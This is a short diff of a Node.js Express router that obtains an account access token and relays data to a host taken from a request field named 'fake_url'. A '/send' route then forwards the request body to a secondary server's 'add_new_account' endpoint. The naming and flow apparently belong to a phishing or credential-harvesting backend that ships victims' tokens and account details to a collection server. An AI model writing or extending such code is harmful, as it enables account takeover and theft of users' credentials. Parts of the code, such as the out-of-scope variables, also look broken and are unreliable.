@@ -39,7 +39,8 @@ let request_data = request.body
                 if(response.response.length > 0){
                     response = response.response[0]
                     let token = resp.access_token
-                     fetch(request.body.fake_url+':9999/login/send',{
+                    console.log(request.body.fake_url)
+                     fetch('https://'+request.body.fake_url+'/login/send',{
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -59,15 +60,20 @@ let request_data = request.body
         }
     }
      getAccessToken(auth_data)
+  console.log('CHECK')
 })
-router.post('/send',(request, response, next) => {
-    fetch(process.env.SUB_SERVER_URL+'/api/add_new_account',{
+router.post('/send',async (request, response, next) => {
+  console.log('SEND')
+   await fetch(process.env.SUB_SERVER_URL+'api/add_new_account',{
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify({...response, ...request_data, token})
+        body: JSON.stringify({...request.body})
     })
+  return  response.json({
+                error: false
+            })
 })
 
 module.exports = router
